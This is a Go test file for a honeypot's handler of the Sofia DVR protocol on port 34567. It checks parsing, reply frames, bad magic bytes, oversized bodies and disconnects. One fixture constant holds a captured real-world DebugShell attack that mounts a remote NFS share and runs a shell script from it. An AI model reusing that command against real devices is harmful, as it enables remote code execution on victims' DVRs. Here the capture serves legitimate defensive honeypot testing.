package tcp

import (
	"context"
	"io"
	"net"
	"testing"
	"time"

	"github.com/mushorg/glutton/connection"
	"github.com/mushorg/glutton/protocols/tcp/sofia"
	"github.com/stretchr/testify/require"
)

// Frames from a DVR DebugShell attempt seen on tcp/34567 (sensor address scrubbed).
const (
	sofiaCaptureBare  = "\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf1\x03\x26\x00\x00\x00" + `{"Ret":100,"SessionID":"0x00000000"}` + "\n\x00"
	sofiaCaptureShell = "\xff\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x1c\x04\xb9\x00\x00\x00" +
		`{"DebugShell":"\ncd /var;umount -f b;mkdir b;mount -o intr,nolock,tcp,exec 170.205.28.207:/srv/nfs/share b;sh b/d.sh","Name":"DebugShell","OprName":"PingDev","SessionID":"0x00000000"}` + "\n\x00"
)

func startSofia(t *testing.T) (net.Conn, *fakeHoneypot, chan error) {
	t.Helper()
	client, serverConn := net.Pipe()
	t.Cleanup(func() { client.Close() })
	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleSofia(context.Background(), serverConn, connection.Metadata{TargetPort: 34567}, &recordingLogger{}, hp)
	}()
	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	return client, hp, done
}

func waitSofia(t *testing.T, hp *fakeHoneypot, done chan error) (producedTCP, error) {
	t.Helper()
	var err error
	select {
	case err = <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}
	produced := <-hp.produced
	require.Empty(t, hp.produced, "exactly one event per session")
	require.Equal(t, "sofia", produced.protocol)
	return produced, err
}

// readSofiaReply reads one full reply frame from the honeypot.
func readSofiaReply(t *testing.T, c net.Conn) []byte {
	t.Helper()
	hdr := make([]byte, sofia.HeaderLen)
	_, err := io.ReadFull(c, hdr)
	require.NoError(t, err)
	h, err := sofia.ParseHeader(hdr)
	require.NoError(t, err)
	body := make([]byte, h.DataLen)
	_, err = io.ReadFull(c, body)
	require.NoError(t, err)
	return append(hdr, body...)
}

func TestHandleSofiaDebugShellCapture(t *testing.T) {
	client, hp, done := startSofia(t)

	// Both messages arrive in a single TCP write, as captured.
	go func() { _, _ = client.Write([]byte(sofiaCaptureBare + sofiaCaptureShell)) }()
	reply1 := readSofiaReply(t, client)
	reply2 := readSofiaReply(t, client)
	require.NoError(t, client.Close())

	produced, err := waitSofia(t, hp, done)
	require.NoError(t, err)
	require.Equal(t, []byte(sofiaCaptureBare), produced.payload)
	require.Equal(t, []parsedSofia{
		{Direction: "read", Header: sofia.Header{Head: 0xff, MsgID: 0x03f1, DataLen: 38}, Command: "msg-1009", Payload: []byte(sofiaCaptureBare)},
		{Direction: "write", Header: sofia.Header{Head: 0xff, MsgID: 0x03f2, DataLen: 38}, Command: "msg-1009", Status: "ok", Payload: reply1},
		{Direction: "read", Header: sofia.Header{Head: 0xff, Sequence: 1, MsgID: 0x041c, DataLen: 185}, Command: "DebugShell", Payload: []byte(sofiaCaptureShell)},
		{Direction: "write", Header: sofia.Header{Head: 0xff, Sequence: 1, MsgID: 0x041d, DataLen: uint32(len(reply2) - sofia.HeaderLen)}, Command: "DebugShell", Status: "ok", Payload: reply2},
	}, produced.decoded)
	require.Equal(t, `{"Ret":100,"SessionID":"0x00000000"}`+"\n\x00", string(reply1[sofia.HeaderLen:]))
}

func TestHandleSofiaBadMagic(t *testing.T) {
	client, hp, done := startSofia(t)

	junk := []byte("GET / HTTP/1.1\r\nHost: x\r\n\r\n")
	go func() { _, _ = client.Write(junk) }() // handler stops after the header, so Write may be cut short

	produced, err := waitSofia(t, hp, done)
	require.ErrorIs(t, err, sofia.ErrBadMagic)
	require.Equal(t, []parsedSofia{{Direction: "read", Payload: junk[:sofia.HeaderLen]}}, produced.decoded)
}

func TestHandleSofiaOversizeBody(t *testing.T) {
	client, hp, done := startSofia(t)

	frame := make([]byte, sofia.HeaderLen+sofiaMaxBody)
	frame[0] = sofia.Magic
	frame[16], frame[17], frame[18] = 0x00, 0x00, 0x10 // 1 MiB declared
	go func() { _, _ = client.Write(frame) }()

	produced, err := waitSofia(t, hp, done)
	require.ErrorIs(t, err, sofia.ErrBodyTooLarge)
	frames, ok := produced.decoded.([]parsedSofia)
	require.True(t, ok)
	require.Len(t, frames, 1)
	got := frames[0]
	require.True(t, got.Truncated)
	require.Len(t, got.Payload, sofia.HeaderLen+sofiaMaxBody)
}

func TestHandleSofiaEarlyDisconnect(t *testing.T) {
	client, hp, done := startSofia(t)

	_, err := client.Write([]byte(sofiaCaptureShell)[:10])
	require.NoError(t, err)
	require.NoError(t, client.Close())

	produced, err := waitSofia(t, hp, done)
	require.NoError(t, err)
	require.Equal(t, []parsedSofia{{Direction: "read", Payload: []byte(sofiaCaptureShell)[:10]}}, produced.decoded)
}

func TestHandleSofiaNoData(t *testing.T) {
	client, hp, done := startSofia(t)
	require.NoError(t, client.Close())

	produced, err := waitSofia(t, hp, done)
	require.NoError(t, err)
	require.Empty(t, produced.decoded)
}
